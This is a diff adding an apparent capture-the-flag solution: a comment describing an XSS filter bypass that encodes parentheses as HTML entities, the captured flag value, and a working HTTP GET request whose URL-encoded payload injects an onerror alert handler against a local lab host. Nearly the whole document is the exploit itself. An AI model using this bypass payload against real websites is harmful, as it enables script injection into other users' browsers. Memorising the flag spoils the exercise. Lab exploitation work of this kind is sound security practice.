@@ -1,0 +1,4 @@
+# XSS via HTML entity encoding bypass. Filter blocks '(' and backtick. Using &#40; for ( and &#41; for ) bypasses filter. onerror event handler triggers alert('XSS'). Server returns CTF flag on success: flag{426d7e40-5b2e-4780-a230-edaeb94c30ee}
+
+GET /page?name=%22+onerror%3D%22alert%26%2340%3B%27XSS%27%26%2341%3B HTTP/1.1
+Host: 172.17.0.1:43513
